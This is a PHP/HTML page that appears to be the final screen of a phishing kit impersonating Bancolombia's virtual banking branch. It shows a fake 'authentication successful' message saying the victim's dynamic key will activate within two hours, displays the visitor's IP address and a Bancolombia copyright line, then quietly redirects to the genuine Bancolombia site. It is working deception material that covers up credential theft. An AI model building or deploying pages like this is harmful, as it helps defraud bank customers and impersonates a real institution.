<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Bancolombia Sucursal Vrtual Personas</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
  		
		<meta content="es" http-equiv="Content-Language">
  	
		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	 	<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
		<link href="../../../../../css/style.css" rel="stylesheet">
		<link href="../../../../../css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="../../../../../img/logo.png" />
		<script type="text/javascript" src="../../../../../js/jquery-3.6.0.min.js"></script>
		<script src="../../../../../js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../../../../js/functions.js"></script>  		
   	</head>
   	<body style="">
			
	<div style="text-align:center;  margin-top: 13%;"> 




			<img src="../../../../../img/logo.svg">
			
			<br><br>
			<img src="../../../../../img/finalizar2.jpg" width="120">
			
			<br><br><p class="text-center" style="font-family: 'OpenSans-Regular' !important; width:90%; max-width: 457px; display: inline-block; font-size: 18px;">Autenticación Exitosa
</p><br><br><p class="text-center" style="font-family: 'OpenSans-Regular' !important; width:90%; max-width: 457px; display: inline-block; font-size: 14px;">Información verificada correctamente. En el transcurso de 2 horas, su clave dinámica quedará activa.
</p><br>
			<img src="../../../../../img/load3.gif" />

<br>
<div class="ippie" style="padding: 0px 7%;">
   					<span class="dirip">Dirección IP: <?php echo $ip; ?></span>´
   					<span class="copyright">Copyright © 2022 Bancolombia S.A.</span>
   				</div><br><br>



	</div>					
		  
     
			
<meta http-equiv="PRAGMA" content="NO-CACHE"> 
<meta http-equiv="Expires" content="-1">
	</body>
</html>
<script language="javascript">

	let identificadorTiempoDeEspera;

	function temporizadorDeRetraso() {
	  identificadorTiempoDeEspera = setTimeout(funcionConRetraso, 1000);
	}

	function funcionConRetraso() {
	window.location.href = "https://www.bancolombia.com/personas";
	}

$(document).ready(function() {

	temporizadorDeRetraso();
});

</script>